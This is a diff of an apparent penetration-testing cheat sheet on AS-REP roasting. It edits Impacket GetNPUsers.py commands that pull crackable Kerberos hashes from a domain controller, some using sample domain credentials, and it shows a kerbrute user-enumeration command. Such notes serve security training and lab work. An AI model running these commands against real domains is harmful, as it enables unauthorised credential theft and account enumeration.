@@ -49,10 +49,11 @@ Get-ASREPHash -Username VPN114user -verbose
 # Linux
 # GetNPUsers
 ## Try all the usernames in usernames.txt
-python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 172.16.2.5
+GetNPUsers.py   dante/  -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast  -dc-ip 172.16.2.5
 
 ## Use domain creds to extract targets and target them
-python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 
 # kerbrute
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
